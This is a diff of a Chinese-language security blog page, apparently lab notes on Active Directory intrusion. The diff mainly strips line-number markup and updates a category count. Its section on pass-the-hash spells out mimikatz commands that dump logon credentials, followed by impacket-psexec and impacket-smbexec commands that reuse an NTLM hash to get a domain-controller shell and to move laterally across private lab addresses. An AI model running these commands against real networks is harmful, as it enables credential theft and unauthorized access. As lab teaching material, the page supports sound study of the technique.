@@ -432,15 +432,15 @@ Win10本地SAM
 <h4 id="8-4-PTH攻击实操示例（针对当前环境）"><a href="#8-4-PTH攻击实操示例（针对当前环境）" class="headerlink" title="8.4 PTH攻击实操示例（针对当前环境）"></a>8.4 PTH攻击实操示例（针对当前环境）</h4><p>假设已通过Web漏洞获得<code>winserv12R2</code>的SYSTEM权限：</p>
 <ol>
 <li><p><strong>在winserv12R2上运行mimikatz抓取域用户<code>user1</code>的哈希</strong>：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
 <p>输出中包含<code>user1</code>的NTLM哈希，例如<code>8846f7eaee8fb117ad06bdd830b7586c</code>。</p>
 </li>
 <li><p><strong>在Kali上使用impacket-psexec直接登录域控</strong>：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c HACKING/user1@192.168.64.10</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c HACKING/user1@192.168.64.10</span><br></pre></td></tr></table></figure>
 <p>成功获得域控的cmd shell。</p>
 </li>
 <li><p><strong>使用相同哈希登录Win10</strong>：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbexec -hashes :8846f7eaee8fb117ad06bdd830b7586c HACKING/user1@192.168.64.30</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-smbexec -hashes :8846f7eaee8fb117ad06bdd830b7586c HACKING/user1@192.168.64.30</span><br></pre></td></tr></table></figure>
 <p>实现横向移动。</p>
 </li>
 </ol>
@@ -576,7 +576,7 @@ window.addEventListener('load', function() {
 			<ul id="categorys" class="tag_box list-unstyled collapse in">
 				  
   <li>
-    <li><a href="/categories/网络安全/">网络安全<span>39</span></a></li> <li><a href="/categories/网络安全/SRC-渗透/">SRC&渗透<span>11</span></a></li> <li><a href="/categories/网络安全/SRC-渗透/内网/">内网<span>3</span></a></li>
+    <li><a href="/categories/网络安全/">网络安全<span>40</span></a></li> <li><a href="/categories/网络安全/SRC-渗透/">SRC&渗透<span>11</span></a></li> <li><a href="/categories/网络安全/SRC-渗透/内网/">内网<span>3</span></a></li>
   </li>
 
 			</ul>
